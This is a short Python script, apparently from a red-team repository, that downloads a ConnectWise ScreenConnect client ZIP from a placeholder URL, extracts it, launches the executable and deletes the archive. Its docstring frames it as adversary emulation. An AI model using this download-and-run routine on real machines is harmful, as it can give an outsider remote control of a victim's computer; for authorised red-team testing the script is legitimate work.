#!/usr/bin/env python3
"""
Python script to download, extract, and run ScreenConnect client for remote support sessions. 
Python needs to be installed on the host already for this to work.
This script is for testing/red team purposes - use only for legal and ethical testing scenarios
For red team/adversarial emulation, you may want to adapt to your specific purposes.  
Paste your URL for ConnectWise ScreenConnect where it says (Paste Install URL here).  
Note: This is not the URL they give you; it is the secondary URL you hunt for via F12, network, and filter on zip.
See the Readme.md files for how to use, including detailed setup steps. 
"""

import os
import sys
import time
import subprocess
import zipfile
import urllib.request
import urllib.error
from pathlib import Path

def find_file_recursive(folder, target_name):
    """Helper function to find file recursively"""
    folder_path = Path(folder)
    
    # First check files in current directory
    for file_path in folder_path.iterdir():
        if file_path.is_file() and file_path.name.lower() == target_name.lower():
            return str(file_path)
    
    # Then check subdirectories recursively
    for dir_path in folder_path.iterdir():
        if dir_path.is_dir():
            result = find_file_recursive(str(dir_path), target_name)
            if result:
                return result
    
    return ""

def main():
    # Configuration
    download_url = "(Paste Install URL here)"  # Replace with your ScreenConnect URL
    zip_name = "ScreenConnect.WindowsClient.zip"
    exe_name = "ScreenConnect.Client.exe"
    
    # Get script directory
    script_folder = Path(__file__).parent.absolute()
    zip_path = script_folder / zip_name
    
    try:
        # Download the ZIP file
        print(f"Downloading {zip_name}...")
        
        urllib.request.urlretrieve(download_url, zip_path)
        
        # Check if download was successful
        if not zip_path.exists():
            print("Download failed. File not found.")
            sys.exit(1)
        
        # Check if file size is greater than 0
        if zip_path.stat().st_size <= 0:
            print("Download failed. File is empty.")
            sys.exit(1)
        
        print("Download complete. Extracting files...")
        
        # Extract ZIP file
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(script_folder)
        
        # Wait for extraction to complete
        time.sleep(2)
        
        # Look for the executable
        exe_path = find_file_recursive(str(script_folder), exe_name)
        if not exe_path:
            print(f"Error: {exe_name} not found after extraction.")
            sys.exit(1)
        
        print(f"Found executable at: {exe_path}")
        print("Launching application...")
        
        # Run the executable
        if os.name == 'nt':  # Windows
            process = subprocess.Popen([exe_path], shell=False)
        else:  # Unix-like systems
            process = subprocess.Popen([exe_path])
        
        if process.poll() is None or process.returncode == 0:
            print("Application launched successfully.")
        else:
            print("Error: Failed to launch application.")
            sys.exit(1)
        
        # Clean up the ZIP file
        if zip_path.exists():
            try:
                zip_path.unlink()
            except Exception as e:
                print(f"Warning: Could not delete ZIP file: {e}")
        
        print("Script completed successfully.")
        
    except urllib.error.URLError as e:
        print(f"Download failed: {e}")
        sys.exit(1)
    except zipfile.BadZipFile:
        print("Error: Downloaded file is not a valid ZIP archive.")
        sys.exit(1)
    except FileNotFoundError as e:
        print(f"Error: {e}")
        sys.exit(1)
    except Exception as e:
        print(f"Unexpected error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
